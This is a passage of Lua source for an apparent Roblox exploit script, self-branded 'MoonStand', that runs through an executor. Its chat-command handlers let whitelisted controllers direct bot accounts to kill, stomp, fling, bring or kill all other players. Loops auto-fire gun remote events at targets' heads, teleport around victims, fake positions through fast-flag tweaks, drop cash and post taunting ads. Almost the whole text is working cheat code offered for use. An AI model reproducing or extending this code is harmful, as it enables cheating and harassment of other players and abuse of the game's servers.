            elseif msgLower == "!unlkill ." then
                lkill = false
            elseif msgLower == "!dropcash ." then
                ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
            elseif msgLower == "!benx ." then
                startBenx(player)
            elseif msgLower == "!unbenx ." then
                benxActive = false
            elseif msgLower == "!talk off" then
                trashtalkactive = false
            end
        end
        
        if (isAuthorized(player)) then
            if msgLower == ".a on" then
                lockedTarget = nil
                voiding = false
                getgenv().enabled = true
                startFollowingTarget(player.Name)
            elseif msgLower == ".a off" then
                getgenv().enabled = false
            elseif msgLower == ".sentry on" then
                lockedTarget = nil
                voiding = false
                getgenv().enabled1 = true
            elseif msgLower == ".sentry off" then
                getgenv().enabled1 = false
            elseif msgLower == ".bsentry on" then      
                for plrName, _ in pairs(Bots) do
                    getgenv().sentryprotected[plrName] = true
                end
            elseif msgLower == ".bsentry off" then      
                for plrName, _ in pairs(Bots) do
                    getgenv().sentryprotected[plrName] = false
                end
            elseif msgLower == ".repair" then
                handleFixCommand()
            elseif msgLower:match("^%.repair%s+([^%s]+)$") then
                local botName = msgLower:match("^%.repair%s+([^%s]+)$")
                handleFixCommand(botName)
            elseif msgLower == ".v" then
                handleHideCommand()
            elseif msgLower:match("^%.v%s+([^%s]+)$") then
                local botName = msgLower:match("^%.v%s+([^%s]+)$")
                handleHideCommand(botName)
            elseif msgLower == ".summon" then
                handleTeleportCommand(player.Name)
            elseif msgLower:match("^%.summon%s+([^%s]+)$") then
                local botName = msgLower:match("^%.summon%s+([^%s]+)$")
                handleTeleportCommand(player.Name, botName)
            elseif msgLower == ".s" then
                teleportToTarget(player.Name)
            elseif msgLower == ".search" then
                lockedTarget = nil
                voiding = false
                teleportPlayerRandomly()
                task.wait(1)
                checkWhitelistNearPosition()
                task.wait(1)
                voiding = true
            elseif msgLower == ".cashdrop on" then
                autodrop = true
            elseif msgLower == ".cashdrop off" then
                autodrop = false
            elseif msgLower == ".abuse on" then
                AbuseProtection = true
            elseif msgLower == ".abuse off" then
                AbuseProtection = false
            elseif msgLower == ".mask on" then
                automaskenabled = true
            elseif msgLower == ".mask off" then
                automaskenabled = false
            elseif EMOTES[msgLower] then
                playLoopedAnimation(EMOTES[msgLower])
            elseif msgLower == ".stop" then
                if currentTrack then
                    currentTrack:Stop()
                    currentTrack = nil
                end
                lastEmote = nil
            elseif msgLower == ".fp on" then
                setfflag("NextGenReplicatorEnabledWrite4", "true")
                task.wait(0.1)
                replicatesignal(game.Players.LocalPlayer.Kill)
            elseif msgLower == ".fp off" then
                setfflag("NextGenReplicatorEnabledWrite4", "false")
                task.wait(0.1)
                replicatesignal(game.Players.LocalPlayer.Kill)
            elseif msgLower == ".leave" then
                game:Shutdown()
            elseif msgLower == ".rejoin" then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
            elseif msgLower:match("^%.say%s+(.+)$") then
                local messageToSay = msgLower:match("^%.say%s+(.+)$")
                sendMessage(messageToSay)
            elseif msgLower:match("^%.awl%s+([^%s]+)$") then
                local input = msgLower:match("^%.awl%s+([^%s]+)$")
                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
                    local name = plr.Name:lower()
                    local display = plr.DisplayName:lower()
                    if name:find(input, 1, true) or display:find(input, 1, true) then
                        getgenv().whitelist[plr.Name] = true
                        break
                    end
                end
            elseif msgLower:match("^%.unawl%s+([^%s]+)$") then
                local input = msgLower:match("^%.unawl%s+([^%s]+)$")
                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
                    local name = plr.Name:lower()
                    local display = plr.DisplayName:lower()
                    if name:find(input, 1, true) or display:find(input, 1, true) then
                        getgenv().whitelist[plr.Name] = nil
                        break
                    end
                end
            elseif msgLower:match("^%.assist%s+([^%s]+)$") then
                local input = msgLower:match("^%.assist%s+([^%s]+)$")
                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
                    local name = plr.Name:lower()
                    local display = plr.DisplayName:lower()
                    if name:find(input, 1, true) or display:find(input, 1, true) then
                        getgenv().sentryprotected[plr.Name] = true
                        break
                    end
                end
            elseif msgLower:match("^%.unassist%s+(.+)$") then
                local input = msgLower:match("^%.unassist%s+(.+)$")
                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
                    local name = plr.Name:lower()
                    local display = plr.DisplayName:lower()
                    if name:find(input, 1, true) or display:find(input, 1, true) then
                        getgenv().sentryprotected[plr.Name] = nil
                        break
                    end
                end
            elseif msgLower:match("^%.l%s+(.+)$") then
                local namesString = msgLower:match("^%.l%s+(.+)$")
                local names = {}
                for name in namesString:gmatch("[^%s]+") do
                    table.insert(names, name:lower())
                end
                local localPlayer = Players.LocalPlayer
                if not localPlayer then return end
                reloadTool()
                lockedTarget = nil
                stomponly = false
                bringonly = false
                takeonly = false
                getgenv().downonly = false
                opkill = false
                voiding = false
                ragebottargets = {}
                summonTarget = nil
                shouldSwitch = true
                for _, inputName in ipairs(names) do
                    for _, targetPlayer in ipairs(Players:GetPlayers()) do
                        local targetPlayerName = targetPlayer.Name:lower()
                        local targetDisplayName = targetPlayer.DisplayName:lower()
                        if targetPlayerName:find(inputName, 1, true) or targetDisplayName:find(inputName, 1, true) then
                            if isProtected(targetPlayer) then
                                sendMessage("Cannot target user " .. targetPlayer.Name .. " because they are premium.")
                            else
                                table.insert(ragebottargets, targetPlayer)
                                break
                            end
                        end
                    end
                end
            elseif msgLower:match("^%.lk%s+([^%s]+)%s+([^%s]+)$") then
                local inputName, botName = msgLower:match("^%.lk%s+([^%s]+)%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleOPKillCommand(inputName, botName)
                        break
                    end
                end
        elseif msgLower:match("^%.right%s+([^%s]+)$") then
            local targetName = msgLower:match("^%.right%s+([^%s]+)$")
            
            local myName = LocalPlayer.Name:lower()
            local myDisplay = LocalPlayer.DisplayName:lower()

            if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
                summonMode = "right"
            end

        elseif msgLower:match("^%.left%s+([^%s]+)$") then
            local targetName = msgLower:match("^%.left%s+([^%s]+)$")
            
            local myName = LocalPlayer.Name:lower()
            local myDisplay = LocalPlayer.DisplayName:lower()

            if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
                summonMode = "left"
            end

        elseif msgLower:match("^%.middle%s+([^%s]+)$") then
            local targetName = msgLower:match("^%.middle%s+([^%s]+)$")
            
            local myName = LocalPlayer.Name:lower()
            local myDisplay = LocalPlayer.DisplayName:lower()

            if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
                summonMode = "middle"
            end
            elseif msgLower:match("^%.fling%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.fling%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleFlingCommand(inputName)
                        break
                    end
                end
                elseif msgLower:match(".akill on") then
                    killall = true
                    summonTarget = nil
                elseif msgLower:match(".akill off") then
                    killall = false
            elseif msgLower:match("^%.lk%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.lk%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleOPKillCommand(inputName)
                        break
                    end
                end
            elseif msgLower:match("^%.s%s+([^%s]+)%s+([^%s]+)$") then
                local inputName, botName = msgLower:match("^%.s%s+([^%s]+)%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleStompCommand(inputName, botName)
                        break
                    end
                end
            elseif msgLower:match("^%.s%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.s%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleStompCommand(inputName)
                        break
                    end
                end
            elseif msgLower:match("^%.b%s+([^%s]+)%s+([^%s]+)$") then
                local inputName, botName = msgLower:match("^%.b%s+([^%s]+)%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleBringCommand(inputName, botName, player.Name)
                        break
                    end
                end
            elseif msgLower:match("^%.b%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.b%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleBringCommand(inputName, nil, player.Name)
                        break
                    end
                end
            elseif msgLower:match("^%.d%s+([^%s]+)%s+([^%s]+)$") then
                local inputName, botName = msgLower:match("^%.d%s+([^%s]+)%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleDownCommand(inputName, botName)
                        break
                    end
                end
            elseif msgLower:match("^%.d%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.d%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleDownCommand(inputName)
                        break
                    end
                end
            elseif msgLower:match("^%.t%s+([^%s]+)%s+([^%s]+)$") then
                local targetName, destinationName = msgLower:match("^%.t%s+([^%s]+)%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name, display = target.Name:lower(), target.DisplayName:lower()
                    if name:find(targetName, 1, true) or display:find(targetName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleTakeCommand(targetName, destinationName)
                        break
                    end
                end
            elseif msgLower:match("^%.tp%s+([^%s]+)$") then
                local locationName = msgLower:match("^%.tp%s+([^%s]+)$")
                handleGotoCommand(player.Name, locationName)
            elseif msgLower:match("^%.sky%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.sky%s+([^%s]+)$")
                for _, target in pairs(Players:GetPlayers()) do
                    local name = target.Name:lower()
                    local display = target.DisplayName:lower()
                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                            return
                        end
                        handleSkyCommand(target.Name)
                        break
                    end
                end
            elseif msgLower:match("^%.wl%s+(.+)$") then
                if player.Name ~= Owner then return end
                local input = msgLower:match("^%.wl%s+(.+)$")
                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
                    local name = plr.Name:lower()
                    local display = plr.DisplayName:lower()
                    if name:find(input, 1, true) or display:find(input, 1, true) then
                        local newTarget = plr.Name
                        whitelistedUsers[newTarget] = true
                        local newPlayer = game.Players:FindFirstChild(newTarget)
                        if newPlayer then
                            setupChatListener(newPlayer)
                        end
                        break
                    end
                end
            elseif msgLower:match("^%.unwl%s+(.+)$") then
                if player.Name ~= Owner then return end
                local input = msgLower:match("^%.unwl%s+(.+)$")
                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
                    local name = plr.Name:lower()
                    local display = plr.DisplayName:lower()
                    if name:find(input, 1, true) or display:find(input, 1, true) then
                        whitelistedUsers[plr.Name] = nil
                        activeListeners[plr.UserId] = nil
                        break
                    end
                end
            end
        end
    end
end

TextChatService.OnIncomingMessage = function(msg)
    for _, handler in pairs(activeListeners) do
        handler(msg)
    end
end

for _, player in pairs(Players:GetPlayers()) do
    if (isAuthorized(player) or isPremium(player) or isBypassPremium(player)) then
        if isAuthorized(player) then
            whitelistedUsers[player.Name] = true
        end
        setupChatListener(player)
        setupDisplayNameListener(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if (isAuthorized(player) or isPremium(player) or isBypassPremium(player)) then
        setupChatListener(player)
        if (isPremium(player) or isBypassPremium(player))  then
            setupDisplayNameListener(player)
        end
    end
end)

local Players = game:GetService("Players")
local LocalPlayer = game:GetService("Players").LocalPlayer
local lockedTargetUserId = nil
local autoLocked = false
local sentrytarget = nil

task.spawn(function()
    while true do
        if not lockedTarget and lockedTargetUserId and not autoLocked then
            for _, player in ipairs(Players:GetPlayers()) do
                if player.UserId == lockedTargetUserId then
                    lockedTarget = player
                    autoLocked = true
                    break
                end
            end
        end
        if lockedTarget then
            local targetCharacter = lockedTarget.Character
            if targetCharacter then
                local bodyEffects = targetCharacter:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                if isKO and trashtalkactive then
                    if not hasSentKOMessage then
                        sendMessage("Get MoonStand g g / Ae3YDeNE53")
                        sendMessage("Get NOOB")
                        sendMessage("MoonStand dominated again!")
                        hasSentKOMessage = true
                    end
                else
                    hasSentKOMessage = false
                end
            end
            if not lockedTarget:IsDescendantOf(game) then
                lockedTargetUserId = lockedTarget.UserId
                lockedTarget = nil
                autoLocked = false
                voiding = true
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if teleporting and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local targetCharacter

            if lockedTarget and lockedTarget.Character then
                targetCharacter = lockedTarget.Character
            elseif sentrytarget and sentrytarget.Character then
                targetCharacter = sentrytarget.Character
            end

            if targetCharacter and LocalPlayer.Character then
                local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
                local playerHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetHRP and playerHRP then
                    playerHRP.CFrame = CFrame.lookAt(
                        targetHRP.Position + Vector3.new(math.random(-20, 20), math.random(-20, 20), math.random(-20, 20)),
                        targetHRP.Position
                    )
                end
            end
        end
        task.wait()
    end
end)

canrun = true
Players = game:GetService("Players")
LocalPlayer = Players.LocalPlayer
char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
humanoid = char:WaitForChild("Humanoid")
rootPart = char:WaitForChild("HumanoidRootPart")

task.spawn(function()
    while true do
        if lockedTarget and not stomponly and not bringonly and not takeonly and not getgenv().downonly and not opkill and not flingonly and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local character = lockedTarget.Character
            local myCharacter = LocalPlayer.Character
            if character and myCharacter then
                local bodyEffects = character:FindFirstChild("BodyEffects")
                local myBodyEffects = myCharacter:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                local isNil = not character:FindFirstChild("UpperTorso") or not character:FindFirstChild("Head")
                local hasForceField = character:FindFirstChildOfClass("ForceField")
                local isReloading = myBodyEffects and myBodyEffects:FindFirstChild("Reload") and myBodyEffects["Reload"].Value
                local myHasForceField = myCharacter:FindFirstChildOfClass("ForceField")
                if AbuseProtection and not myHasForceField and not isReloading and not refreshingfakeposition then
                    local humanoid = myCharacter:FindFirstChild("Humanoid")
                    if humanoid then
                        canrun = false
                        voiding = true
                        teleporting = false
                        task.wait(0.1)
                        humanoid.Health = 0
                        task.wait(0.1)
                        canrun = true
                    end
                end
                if (isSDeath or isNil) and not isReloading and canrun then
                    teleporting = false
                    voiding = true
                    reloadTool()
                    shouldSwitch = true
                    if not didRefreshOnDeath and fpactive then
                        didRefreshOnDeath = true
                        task.delay(0.2, function()
                            refreshingfakeposition = true
                            setfflag("S2PhysicsSenderRate", 0)
                            setfpscap(4)
                            task.wait(0.1)
                            setfflag("S2PhysicsSenderRate", 20000000000)
                            setfpscap(240)
                            task.wait(3.65)
                            refreshingfakeposition = false
                        end)
                    end
                elseif isKO and not isSDeath and not isGrabbed and not isNil and not isReloading and canrun and not refreshingfakeposition then
                    voiding = false
                    teleporting = false
                    local upperTorso = character:FindFirstChild("UpperTorso")
                    if upperTorso and LocalPlayer.Character then
                        local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            humanoidRootPart.Velocity = Vector3.zero
                            humanoidRootPart.RotVelocity = Vector3.zero
                            humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                            humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                            humanoidRootPart.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                            task.wait(0.1)
                        end
                    end
                elseif not isKO and not isSDeath and not hasForceField and not isGrabbed and not isNil and not isReloading and canrun and not refreshingfakeposition then
                    teleporting = true
                    voiding = false
                    didRefreshOnDeath = false
                elseif isReloading and not refreshingfakeposition then
                    teleporting = false
                    voiding = true
                elseif hasForceField and not isReloading and not refreshingfakeposition then
                    teleporting = false
                    voiding = true
                    reloadTool()
                end
            end
            ReplicatedStorage.MainEvent:FireServer("Stomp")
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if stomponly and not bringonly and not takeonly and not getgenv().downonly and not opkill and lockedTarget and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local character = lockedTarget.Character
            if character then
                local bodyEffects = character:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value

                if isKO and not isSDeath then
                    teleporting = false
                    voiding = false
                    local upperTorso = character:FindFirstChild("UpperTorso")
                    if upperTorso and LocalPlayer.Character then
                        local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            humanoidRootPart.Velocity = Vector3.zero
                            humanoidRootPart.RotVelocity = Vector3.zero
                            humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                            humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                            humanoidRootPart.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                            task.wait(0.1)
                        end
                    end
                elseif isSDeath then
                    lockedTarget = nil
                    teleporting = false
                    voiding = true
                    reloadTool()
                elseif not isKO and not isSDeath then
                    teleporting = true
                    voiding = false
                end
            end
            ReplicatedStorage.MainEvent:FireServer("Stomp")
        end
        task.wait()
    end
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local bringconnection = nil

task.spawn(function()
    while true do
        if bringonly and lockedTarget and lockedTarget.Character and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local character = lockedTarget.Character

            local bodyEffects = character and character:FindFirstChild("BodyEffects")

            local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
            local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value

            local grabbed = false

            local character = lockedTarget.Character
            local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local upperTorso = character and character:FindFirstChild("UpperTorso")

            if bringconnection then
                bringconnection:Disconnect()
                bringconnection = nil
            end

            bringconnection = character.ChildAdded:Connect(function(child)
                if child.Name == "GRABBING_CONSTRAINT" then
                    grabbed = true
                    lockedTarget = nil
                    if bringconnection then bringconnection:Disconnect() bringconnection = nil end
                end
            end)

            if character:FindFirstChild("GRABBING_CONSTRAINT") then
                grabbed = true
                lockedTarget = nil
                if bringconnection then bringconnection:Disconnect() bringconnection = nil end
            end

            if not grabbed and isKO and humanoidRootPart and upperTorso then
                teleporting = false
                voiding = false

                humanoidRootPart.Velocity = Vector3.zero
                humanoidRootPart.RotVelocity = Vector3.zero
                humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                humanoidRootPart.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                task.wait(0.3)
            else
                teleporting = true
                voiding = false
            end

            if grabbed then
                lockedTarget = nil
                teleportToTarget(commandSender)
                task.wait(0.3)
                ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                task.wait(0.3)
                voiding = true
                reloadTool()
            end
        end
        task.wait()
    end
end)

local takeconnection = nil

task.spawn(function()
    while true do
        if takeonly and lockedTarget and lockedTarget.Character and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local character = lockedTarget.Character

            local bodyEffects = character and character:FindFirstChild("BodyEffects")

            local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
            local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value

            local grabbed = false

            local character = lockedTarget.Character
            local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local upperTorso = character and character:FindFirstChild("UpperTorso")

            if takeconnection then
                takeconnection:Disconnect()
                takeconnection = nil
            end

            takeconnection = character.ChildAdded:Connect(function(child)
                if child.Name == "GRABBING_CONSTRAINT" then
                    grabbed = true
                    lockedTarget = nil
                    if takeconnection then takeconnection:Disconnect() takeconnection = nil end
                end
            end)

            if character:FindFirstChild("GRABBING_CONSTRAINT") then
                grabbed = true
                lockedTarget = nil
                if takeconnection then takeconnection:Disconnect() takeconnection = nil end
            end

            if not grabbed and isKO and humanoidRootPart and upperTorso then
                teleporting = false
                voiding = false

                humanoidRootPart.Velocity = Vector3.zero
                humanoidRootPart.RotVelocity = Vector3.zero
                humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                humanoidRootPart.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                task.wait(0.3)
            else
                teleporting = true
                voiding = false
            end

            if grabbed then
                local localChar = LocalPlayer.Character
                local hrp = localChar and localChar:FindFirstChild("HumanoidRootPart")

                if skyTarget and hrp then
                    lockedTarget = nil
                    hrp.CFrame = CFrame.new(0, -999999999, 0)
                    task.wait(0.3)
                    ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                    task.wait(0.3)
                    voiding = true
                    reloadTool()
                    skyTarget = nil
                end

                if gotoCFrame and gotoPlayer and hrp then
                    lockedTarget = nil
                    hrp.CFrame = gotoCFrame
                    task.wait(0.3)
                    ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                    task.wait(0.3)
                    voiding = true
                    reloadTool()
                    gotoPlayer = nil
                    gotoCFrame = nil
                end

                if savedTarget5 then
                    local dstChar = savedTarget5.Character
                    if dstChar and dstChar:FindFirstChild("HumanoidRootPart") and hrp then
                        lockedTarget = nil
                        local dstPos = dstChar.HumanoidRootPart.Position
                        teleportToPosition(dstPos)
                        task.wait(0.3)
                        ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                        task.wait(0.3)
                        voiding = true
                        reloadTool()
                    end
                    savedTarget5 = nil
                end
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if getgenv().downonly and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) and not stomponly and not bringonly and not takeonly and not opkill and lockedTarget then
            local character = lockedTarget.Character
            if character then
                local bodyEffects = character:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value

                if not isKO and not isSDeath then
                    teleporting = true
                    voiding = false
                elseif isKO or isSDeath then
                    lockedTarget = nil
                    voiding = true
                    reloadTool()
                end
            end
        end
        task.wait()
    end
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

task.spawn(function()
    while true do
        if opkill and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) and not stomponly and not bringonly and not takeonly and not getgenv().downonly and lockedTarget then
            local character = lockedTarget.Character
            if character then
                local bodyEffects = character:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                local isGrabbed = character:FindFirstChild("GRABBING_CONSTRAINT")
                local hasForceField = character:FindFirstChildOfClass("ForceField")

                if not isKO and not isSDeath and not isGrabbed and not hasForceField then
                    teleporting = true
                    voiding = false
                elseif isKO or isSDeath or isGrabbed or hasForceField then
                    voiding = true
                    teleporting = false
                end
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if flingonly and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) and not stomponly and not bringonly and not takeonly and not getgenv().downonly and lockedTarget then
            local char = Player.Character
            local targetHRP = lockedTarget.Character and lockedTarget.Character:FindFirstChild("HumanoidRootPart")

            if char and char:FindFirstChild("HumanoidRootPart") and targetHRP then
                teleporting = true
                voiding = false

                char.HumanoidRootPart.CFrame = CFrame.new(
                    targetHRP.Position + Vector3.new(0, 0, math.random(-30, 30))
                )
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if killall and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then

            local switchTarget = false
            if lockedTarget and lockedTarget.Character then
                local character = lockedTarget.Character
                local bodyEffects = character:FindFirstChild("BodyEffects")
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                if isSDeath then
                    switchTarget = true
                end
            else
                switchTarget = true
            end

            if switchTarget then
                local candidates = {}
                for _, player in pairs(Players:GetPlayers()) do
                    if player.Name ~= Owner
                       and player ~= Players.LocalPlayer
                       and player.Character 
                       and player.Character:FindFirstChild("BodyEffects") 
                       and player.Character.BodyEffects:FindFirstChild("SDeath") 
                       and not player.Character.BodyEffects["SDeath"].Value
                       and not player.Character:FindFirstChild("GRABBING_CONSTRAINT") then
                        table.insert(candidates, player)
                    end
                end

                if #candidates > 0 then
                    lockedTarget = candidates[math.random(1, #candidates)]
                end
            end
        end
        task.wait()
    end
end)

RunService.Heartbeat:Connect(function()
    local targetCharacter
    local target

    if lockedTarget and lockedTarget.Character then
        targetCharacter = lockedTarget.Character
        target = lockedTarget
    elseif sentrytarget and sentrytarget.Character then
        targetCharacter = sentrytarget.Character
        target = sentrytarget
    end

    if not targetCharacter or not targetCharacter:FindFirstChild("HumanoidRootPart") then return end
    if target == LocalPlayer then
        lockedTarget = nil
        voiding = true
        return
    end

    local targetPart = targetCharacter:FindFirstChild("Head")
    local bodyEffects = targetCharacter:FindFirstChild("BodyEffects")
    local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
    local isGrabbed = targetCharacter:FindFirstChild("GRABBING_CONSTRAINT")
    local hrp = targetCharacter:FindFirstChild("HumanoidRootPart")
    if isKO or isGrabbed or not hrp or not targetPart then return end
    if (flingonly and target) then return end
    local playerChar = game.Players.LocalPlayer.Character
    for _, tool in ipairs(playerChar:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
            local handle = tool.Handle
            ReplicatedStorage.MainEvent:FireServer(
                "ShootGun",
                handle,
                handle.Position,
                targetPart.Position,
                targetPart,
                Vector3.new(0, 0, 0)
            )
        end
    end
end)

RunService.Heartbeat:Connect(function()
    if getgenv().enabled and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Handle") then
        local koValue = LocalPlayer.Character:FindFirstChild("BodyEffects") and LocalPlayer.Character.BodyEffects:FindFirstChild("K.O")
        if not koValue or not koValue.Value then
            local closest = math.huge
            local target = nil

            for _, player in pairs(game.Players:GetPlayers()) do
                if player ~= LocalPlayer and not getgenv().whitelist[player.Name] and not getgenv().protectedwhitelist[player.Name] and player.Character and player.Character:FindFirstChild("Head") and not player.Character:FindFirstChild("GRABBING_CONSTRAINT") and not player.Character:FindFirstChild("ForceField") then
                    if workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild(player.Name) and workspace.Players:FindFirstChild(player.Name):FindFirstChild("BodyEffects") and workspace.Players:FindFirstChild(player.Name).BodyEffects:FindFirstChild("K.O") and not workspace.Players:FindFirstChild(player.Name).BodyEffects["K.O"].Value then
                        local dist = (LocalPlayer.Character.HumanoidRootPart.Position - player.Character.Head.Position).Magnitude
                        if dist < closest then
                            closest = dist
                            target = player
                        end
                    end
                end
            end

